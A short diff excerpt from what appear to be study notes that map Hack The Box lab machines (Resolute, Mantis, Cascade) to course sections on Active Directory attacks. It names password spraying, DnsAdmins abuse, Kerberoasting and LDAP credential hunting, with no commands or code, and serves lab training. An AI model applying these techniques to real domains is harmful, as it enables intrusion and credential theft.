+- HTB Resolute. Password spray finds ryan's domain creds → DnsAdmins abuse. Matches 23.2.1
 
 **Adjacent workflow boxes:**
-- HTB Mantis — Kerberoasting via SQL Server connection + credential chain. SPN-based attack pattern from 23.2.3
-- HTB Cascade — LDAP attribute hunting yields legacy credential → AD group abuse. Setup phase before auth attacks
+- HTB Mantis. Kerberoasting via SQL Server connection + credential chain. SPN-based attack pattern from 23.2.3
+- HTB Cascade. LDAP attribute hunting yields legacy credential → AD group abuse. Setup phase before auth attacks
 
 ---
 
